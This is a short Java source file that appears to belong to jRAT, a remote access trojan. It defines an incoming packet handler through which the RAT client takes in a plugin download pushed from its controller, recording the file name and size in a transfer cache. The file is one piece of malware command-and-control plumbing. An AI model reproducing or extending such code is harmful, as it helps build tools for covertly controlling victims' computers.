package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.io.FileCache;
import jrat.common.io.TransferData;

public class Packet106ClientDownloadPlugin implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.readBoolean();
		String f = con.readLine();
		long l = con.readLong();

		TransferData d = new TransferData(true);
		d.setTotal(l);

		FileCache.put(f, d);
	}

}
